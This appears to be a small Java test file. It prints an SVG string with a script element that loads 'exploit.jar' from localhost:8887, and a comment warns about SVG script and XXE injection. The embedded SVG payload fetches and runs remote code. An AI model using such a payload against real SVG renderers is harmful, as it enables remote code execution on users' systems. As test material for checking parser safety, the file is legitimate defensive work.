package test;

public class Main {
    public static void main(String[] args) {
        // SECURITY WARNING: SVG <script> tag with xlink:href can load remote Java archives,
        // enabling arbitrary code execution (RCE) in the browser context.
        // This is an XXE / SVG injection attack vector — never embed user-controlled SVG content
        // without strict Content-Security-Policy and X-Content-Type-Options headers.
        // See: CWE-611 (XXE), CWE-79 (XSS via SVG script injection)
        String xml = "<svg xmlns=\"http://www.w3.org/2000/svg\" " +
                "xmlns:xlink=\"http://www.w3.org/1999/xlink\" " +
                "version=\"1.0\"> <script type=\"application/java-archive\" " +
                "xlink:href=\"http://localhost:8887/exploit.jar\"/> " +
                "<text>Static text ...</text> </svg>";
        System.out.println(xml);
    }
}
